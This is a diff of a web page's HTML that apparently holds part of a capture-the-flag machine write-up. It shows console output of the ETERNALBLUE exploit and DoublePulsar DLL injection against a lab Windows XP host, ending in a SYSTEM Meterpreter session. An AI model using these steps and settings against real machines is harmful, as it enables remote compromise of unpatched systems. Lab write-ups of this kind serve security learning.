-</span><span class="go">[*] Forcing MaxExploitAttempts to 1.
-</span><span class="go">[*] Target OS selected valid for OS indicated by SMB reply
-</span><span class="go">[*] CORE raw buffer dump (12 bytes):
-</span><span class="go">0x00000000  57 69 6e 64 6f 77 73 20 35 2e 31 00              Windows 5.1.
-</span><span class="go">[*] Fingerprinting SMB non-paged pool quota
-</span><span class="go">    [+] Allocation total: 0xfff4
-</span><span class="go">    [+] Spray size: 0
-</span><span class="go">    [+] Allocation total: 0x1ffe8
-</span><span class="go">    [+] Spray size: 1
-</span><span class="go">    [+] Allocation total: 0x2ffdc
-</span><span class="go">    [+] Spray size: 2
-</span><span class="go">    [+] Allocation total: 0x3ffd0
-</span><span class="go">    [+] Spray size: 3
-</span><span class="go">    [+] Allocation total: 0x4ffc4
-</span><span class="go">    [+] Spray size: 4
-</span><span class="go">    [+] Allocation total: 0x5ffb8
-</span><span class="go">    [+] Spray size: 5
-</span><span class="go">    [+] Allocation total: 0x6ffac
-</span><span class="go">    [+] Spray size: 6
-</span><span class="go">    [+] Allocation total: 0x7ffa0
-</span><span class="go">    [+] Spray size: 7
-</span><span class="go">    [+] Allocation total: 0x8ff94
-</span><span class="go">    [+] Spray size: 8
-</span><span class="go">    [+] Allocation total: 0x9ff88
-</span><span class="go">    [+] Spray size: 9
-</span><span class="go">    [+] Allocation total: 0xaff7c
-</span><span class="go">    [+] Spray size: 10
-</span><span class="go">    [+] Allocation total: 0xbff70
-</span><span class="go">    [+] Spray size: 11
-</span><span class="go">    [+] Quota NOT exceeded after 12 packets
-</span><span class="go">    [+] Allocation total: 0xbff70
-</span><span class="go">[*] Building exploit buffer
-</span><span class="go">[*] Sending all but last fragment of exploit packet
-</span><span class="go">    ................DONE.
-</span><span class="go">[*] Sending SMB Echo request
-</span><span class="go">[*] Good reply from SMB Echo request
-</span><span class="go">[*] Starting non-paged pool grooming
-</span><span class="go">    [+] Sending 2 non-paged pool fragment packets
-</span><span class="go">        ....DONE.
-</span><span class="go">    [+] Sent 2 non-paged pool fragment packets ofsize 0x00006FF9
-</span><span class="go">    [+] Sending 10 non-paged pool grooming packets
-</span><span class="go">        ..........DONE.
-</span><span class="go">    [+] Sent 10 non-paged pool grooming packets - groom complete
-</span><span class="go">[*] Sending SMB Echo request
-</span><span class="go">[*] Good reply from SMB Echo request
-</span><span class="go">[*] Sending last fragment of exploit packet!
-</span><span class="go">    DONE.
-</span><span class="go">[*] Receiving response from exploit packet
-</span><span class="go">    [+] ETERNALBLUE overwrite completed successfully (0xC000000D)!
-</span><span class="go">[*] Triggering free of corrupted buffer.
-</span><span class="go">[*] Pinging backdoor...
-</span><span class="go">    [+] Backdoor returned code: 10 - Success!
-</span><span class="go">    [+] Ping returned Target architecture: x86 (32-bit)
-</span><span class="go">    [+] Backdoor installed
-</span><span class="go">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-</span><span class="go">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-</span><span class="go">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
-</span><span class="go">[*] CORE sent serialized output blob (2 bytes):
-</span><span class="go">0x00000000  08 00                                            ..
-</span><span class="go">[*] Received output parameters from CORE
-</span><span class="go">[+] CORE terminated with status code 0x00000000
-</span><span class="go">[+] Eternalblue Succeeded
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">[?] Execute Plugin? [Yes] : y    
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Executing Plugin
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Connecting to target for exploitation.
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Connection established for exploitation.
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Pinging backdoor...
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Backdoor not installed, game on.
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Forcing MaxExploitAttempts to 1.
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Target OS selected valid for OS indicated by SMB reply
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] CORE raw buffer dump (12 bytes):
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000000  57 69 6e 64 6f 77 73 20 35 2e 31 00              Windows 5.1.
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Fingerprinting SMB non-paged pool quota
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Allocation total: 0xfff4
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Spray size: 0
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Allocation total: 0x1ffe8
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Spray size: 1
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Allocation total: 0x2ffdc
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Spray size: 2
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Allocation total: 0x3ffd0
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Spray size: 3
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Allocation total: 0x4ffc4
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Spray size: 4
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Allocation total: 0x5ffb8
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Spray size: 5
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Allocation total: 0x6ffac
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Spray size: 6
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Allocation total: 0x7ffa0
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Spray size: 7
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Allocation total: 0x8ff94
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Spray size: 8
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Allocation total: 0x9ff88
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Spray size: 9
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Allocation total: 0xaff7c
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Spray size: 10
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Allocation total: 0xbff70
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Spray size: 11
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Quota NOT exceeded after 12 packets
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Allocation total: 0xbff70
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Building exploit buffer
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Sending all but last fragment of exploit packet
+</span></span></span><span class="line"><span class="cl"><span class="go">    ................DONE.
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Sending SMB Echo request
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Good reply from SMB Echo request
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Starting non-paged pool grooming
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Sending 2 non-paged pool fragment packets
+</span></span></span><span class="line"><span class="cl"><span class="go">        ....DONE.
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Sent 2 non-paged pool fragment packets ofsize 0x00006FF9
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Sending 10 non-paged pool grooming packets
+</span></span></span><span class="line"><span class="cl"><span class="go">        ..........DONE.
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Sent 10 non-paged pool grooming packets - groom complete
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Sending SMB Echo request
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Good reply from SMB Echo request
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Sending last fragment of exploit packet!
+</span></span></span><span class="line"><span class="cl"><span class="go">    DONE.
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Receiving response from exploit packet
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] ETERNALBLUE overwrite completed successfully (0xC000000D)!
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Triggering free of corrupted buffer.
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Pinging backdoor...
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Backdoor returned code: 10 - Success!
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Ping returned Target architecture: x86 (32-bit)
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Backdoor installed
+</span></span></span><span class="line"><span class="cl"><span class="go">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+</span></span></span><span class="line"><span class="cl"><span class="go">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+</span></span></span><span class="line"><span class="cl"><span class="go">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] CORE sent serialized output blob (2 bytes):
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000000  08 00                                            ..
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Received output parameters from CORE
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] CORE terminated with status code 0x00000000
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Eternalblue Succeeded
+</span></span></span></code></pre></div></div></p>
 
 <h3 id="executing-doublepulsar">Executing DoublePulsar</h3>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">fb Special (Eternalblue) &gt; use DoublePulsar
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[!] Entering Plugin Context :: Doublepulsar
-</span><span class="go">[*] Applying Global Variables
-</span><span class="go">[+] Set NetworkTimeout =&gt; 60
-</span><span class="go">[+] Set TargetIp =&gt; 10.10.10.4
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[*] Applying Session Parameters
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[!] Enter Prompt Mode :: Doublepulsar
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Module: Doublepulsar
-</span><span class="go">====================
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Name              Value                                                 
-</span><span class="go">----              -----                                                 
-</span><span class="go">NetworkTimeout    60                                                    
-</span><span class="go">TargetIp          10.10.10.4                                            
-</span><span class="go">TargetPort        445                                                   
-</span><span class="go">OutputFile                                                              
-</span><span class="go">Protocol          SMB                                                   
-</span><span class="go">Architecture      x86                                                   
-</span><span class="go">Function          OutputInstall                                         
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[!] Plugin Variables are NOT Valid
-</span><span class="go">[?] Prompt For Variable Settings? [Yes] : 
-</span><span class="go">[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1 for no timeout.
-</span><span class="go">[?] NetworkTimeout [60] : 
-</span><span class="go">[*]  TargetIp :: Target IP Address
-</span><span class="go">[?] TargetIp [10.10.10.4] : 
-</span><span class="go">[*]  TargetPort :: Port used by the Double Pulsar back door
-</span><span class="go">[?] TargetPort [445] : 
-</span><span class="go">[*]  Protocol :: Protocol for the backdoor to speak
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">*-&gt; 0) SMB     Ring 0 SMB (TCP 445) backdoor
-</span><span class="go">    1) RDP     Ring 0 RDP (TCP 3389) backdoor
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[?] Protocol [0] : 
-</span><span class="go">[*]  Architecture :: Architecture of the target OS
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">*-&gt; 0) x86     x86 32-bits
-</span><span class="go">    1) x64     x64 64-bits
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[?] Architecture [0] : 
-</span><span class="go">[*]  Function :: Operation for backdoor to perform
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">    0) OutputInstall     Only output the install shellcode to a binary file on disk.
-</span><span class="go">    1) Ping              Test for presence of backdoor
-</span><span class="go">*-&gt; 2) RunDLL            Use an APC to inject a DLL into a user mode process.
-</span><span class="go">    3) RunShellcode      Run raw shellcode
-</span><span class="go">    4) Uninstall         Remove&#39;s backdoor from system
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[?] Function [0] : 2
-</span><span class="go">[+] Set Function =&gt; RunDLL
-</span><span class="go">[*]  DllPayload :: DLL to inject into user mode
-</span><span class="go">[?] DllPayload [] : 
-</span><span class="go">[*]  DllPayload :: DLL to inject into user mode
-</span><span class="go">[?] DllPayload [] : C:\shell.dll
-</span><span class="go">[+] Set DllPayload =&gt; C:\shell.dll
-</span><span class="go">[*]  DllOrdinal :: The exported ordinal number of the DLL being injected to call
-</span><span class="go">[?] DllOrdinal [1] : 
-</span><span class="go">[*]  ProcessName :: Name of process to inject into
-</span><span class="go">[?] ProcessName [lsass.exe] : svchost.exe    
-</span><span class="go">[+] Set ProcessName =&gt; svchost.exe
-</span><span class="go">[*]  ProcessCommandLine :: Command line of process to inject into
-</span><span class="go">[?] ProcessCommandLine [] : 
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[!] Preparing to Execute Doublepulsar
-</span><span class="go">[*] Redirection OFF
-</span><span class="go">[+] Configure Plugin Local Tunnels
-</span><span class="go">[+] Local Tunnel - local-tunnel-1
-</span><span class="go">[?] Destination IP [10.10.10.4] : 
-</span><span class="go">[?] Destination Port [445] : 
-</span><span class="go">[+] (TCP) Local 10.10.10.4:445
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[+] Configure Plugin Remote Tunnels
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">fb Special (Eternalblue) &gt; use DoublePulsar
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] Entering Plugin Context :: Doublepulsar
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Applying Global Variables
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Set NetworkTimeout =&gt; 60
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Set TargetIp =&gt; 10.10.10.4
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Applying Session Parameters
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] Enter Prompt Mode :: Doublepulsar
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Module: Doublepulsar
+</span></span></span><span class="line"><span class="cl"><span class="go">====================
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Name              Value                                                 
+</span></span></span><span class="line"><span class="cl"><span class="go">----              -----                                                 
+</span></span></span><span class="line"><span class="cl"><span class="go">NetworkTimeout    60                                                    
+</span></span></span><span class="line"><span class="cl"><span class="go">TargetIp          10.10.10.4                                            
+</span></span></span><span class="line"><span class="cl"><span class="go">TargetPort        445                                                   
+</span></span></span><span class="line"><span class="cl"><span class="go">OutputFile                                                              
+</span></span></span><span class="line"><span class="cl"><span class="go">Protocol          SMB                                                   
+</span></span></span><span class="line"><span class="cl"><span class="go">Architecture      x86                                                   
+</span></span></span><span class="line"><span class="cl"><span class="go">Function          OutputInstall                                         
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] Plugin Variables are NOT Valid
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] Prompt For Variable Settings? [Yes] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1 for no timeout.
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] NetworkTimeout [60] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  TargetIp :: Target IP Address
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] TargetIp [10.10.10.4] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  TargetPort :: Port used by the Double Pulsar back door
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] TargetPort [445] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  Protocol :: Protocol for the backdoor to speak
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">*-&gt; 0) SMB     Ring 0 SMB (TCP 445) backdoor
+</span></span></span><span class="line"><span class="cl"><span class="go">    1) RDP     Ring 0 RDP (TCP 3389) backdoor
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[?] Protocol [0] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  Architecture :: Architecture of the target OS
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">*-&gt; 0) x86     x86 32-bits
+</span></span></span><span class="line"><span class="cl"><span class="go">    1) x64     x64 64-bits
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[?] Architecture [0] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  Function :: Operation for backdoor to perform
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    0) OutputInstall     Only output the install shellcode to a binary file on disk.
+</span></span></span><span class="line"><span class="cl"><span class="go">    1) Ping              Test for presence of backdoor
+</span></span></span><span class="line"><span class="cl"><span class="go">*-&gt; 2) RunDLL            Use an APC to inject a DLL into a user mode process.
+</span></span></span><span class="line"><span class="cl"><span class="go">    3) RunShellcode      Run raw shellcode
+</span></span></span><span class="line"><span class="cl"><span class="go">    4) Uninstall         Remove&#39;s backdoor from system
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[?] Function [0] : 2
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Set Function =&gt; RunDLL
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  DllPayload :: DLL to inject into user mode
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] DllPayload [] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  DllPayload :: DLL to inject into user mode
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] DllPayload [] : C:\shell.dll
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Set DllPayload =&gt; C:\shell.dll
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  DllOrdinal :: The exported ordinal number of the DLL being injected to call
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] DllOrdinal [1] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  ProcessName :: Name of process to inject into
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] ProcessName [lsass.exe] : svchost.exe    
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Set ProcessName =&gt; svchost.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]  ProcessCommandLine :: Command line of process to inject into
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] ProcessCommandLine [] : 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] Preparing to Execute Doublepulsar
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Redirection OFF
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Configure Plugin Local Tunnels
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Local Tunnel - local-tunnel-1
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] Destination IP [10.10.10.4] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[?] Destination Port [445] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] (TCP) Local 10.10.10.4:445
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[+] Configure Plugin Remote Tunnels
+</span></span></span></code></pre></div></div>
 
 <p>These are our final settings for DoublePulsar:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">Module: Doublepulsar
-</span><span class="go">====================
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Name                  Value                                                 
-</span><span class="go">----                  -----                                                 
-</span><span class="go">NetworkTimeout        60                                                    
-</span><span class="go">TargetIp              10.10.10.4                                            
-</span><span class="go">TargetPort            445                                                   
-</span><span class="go">DllPayload            C:\shell.dll                                          
-</span><span class="go">DllOrdinal            1                                                     
-</span><span class="go">ProcessName           svchost.exe                                           
-</span><span class="go">ProcessCommandLine                                                          
-</span><span class="go">Protocol              SMB                                                   
-</span><span class="go">Architecture          x86                                                   
-</span><span class="go">Function              RunDLL
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Module: Doublepulsar
+</span></span></span><span class="line"><span class="cl"><span class="go">====================
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Name                  Value                                                 
+</span></span></span><span class="line"><span class="cl"><span class="go">----                  -----                                                 
+</span></span></span><span class="line"><span class="cl"><span class="go">NetworkTimeout        60                                                    
+</span></span></span><span class="line"><span class="cl"><span class="go">TargetIp              10.10.10.4                                            
+</span></span></span><span class="line"><span class="cl"><span class="go">TargetPort            445                                                   
+</span></span></span><span class="line"><span class="cl"><span class="go">DllPayload            C:\shell.dll                                          
+</span></span></span><span class="line"><span class="cl"><span class="go">DllOrdinal            1                                                     
+</span></span></span><span class="line"><span class="cl"><span class="go">ProcessName           svchost.exe                                           
+</span></span></span><span class="line"><span class="cl"><span class="go">ProcessCommandLine                                                          
+</span></span></span><span class="line"><span class="cl"><span class="go">Protocol              SMB                                                   
+</span></span></span><span class="line"><span class="cl"><span class="go">Architecture          x86                                                   
+</span></span></span><span class="line"><span class="cl"><span class="go">Function              RunDLL
+</span></span></span></code></pre></div></div></p>
 
 <p><strong>It&rsquo;s important to change the ProcessName from lsass.exe to svchost.exe !!!</strong>  Now, let&rsquo;s execute it:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">[?] Execute Plugin? [Yes] : 
-</span><span class="go">[*] Executing Plugin
-</span><span class="go">[+] Selected Protocol SMB
-</span><span class="go">[.] Connecting to target...
-</span><span class="go">[+] Connected to target, pinging backdoor...
-</span><span class="go">    [+] Backdoor returned code: 10 - Success!
-</span><span class="go">    [+] Ping returned Target architecture: x86 (32-bit) - XOR Key: 0x00811F87
-</span><span class="go">    SMB Connection string is: Windows 5.1
-</span><span class="go">    Target OS is: XP x86
-</span><span class="go">    [+] Backdoor installed
-</span><span class="go">    [+] DLL built
-</span><span class="go">    [.] Sending shellcode to inject DLL
-</span><span class="go">    [+] Backdoor returned code: 10 - Success!
-</span><span class="go">    [+] Backdoor returned code: 10 - Success!
-</span><span class="go">    [+] Backdoor returned code: 10 - Success!
-</span><span class="go">    [+] Command completed successfully
-</span><span class="go">[+] Doublepulsar Succeeded
-</span><span class="go">Back to metasploit:
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">[*] Sending stage (179267 bytes) to 10.10.10.4
-</span><span class="go">[*] Meterpreter session 1 opened
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">meterpreter &gt; getuid
-</span><span class="go">Server username: NT AUTHORITY\SYSTEM :D
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">[?] Execute Plugin? [Yes] : 
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Executing Plugin
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Selected Protocol SMB
+</span></span></span><span class="line"><span class="cl"><span class="go">[.] Connecting to target...
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Connected to target, pinging backdoor...
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Backdoor returned code: 10 - Success!
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Ping returned Target architecture: x86 (32-bit) - XOR Key: 0x00811F87
+</span></span></span><span class="line"><span class="cl"><span class="go">    SMB Connection string is: Windows 5.1
+</span></span></span><span class="line"><span class="cl"><span class="go">    Target OS is: XP x86
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Backdoor installed
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] DLL built
+</span></span></span><span class="line"><span class="cl"><span class="go">    [.] Sending shellcode to inject DLL
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Backdoor returned code: 10 - Success!
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Backdoor returned code: 10 - Success!
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Backdoor returned code: 10 - Success!
+</span></span></span><span class="line"><span class="cl"><span class="go">    [+] Command completed successfully
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Doublepulsar Succeeded
+</span></span></span><span class="line"><span class="cl"><span class="go">Back to metasploit:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Sending stage (179267 bytes) to 10.10.10.4
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Meterpreter session 1 opened
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">meterpreter &gt; getuid
+</span></span></span><span class="line"><span class="cl"><span class="go">Server username: NT AUTHORITY\SYSTEM :D
+</span></span></span></code></pre></div></div></p>
 
         </div>
 
@@ -747,97 +747,21 @@ We need a DLL shellcode payload. You can use msfvenom to make it or anything els
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -863,17 +787,33 @@ We need a DLL shellcode payload. You can use msfvenom to make it or anything els
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/rold/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
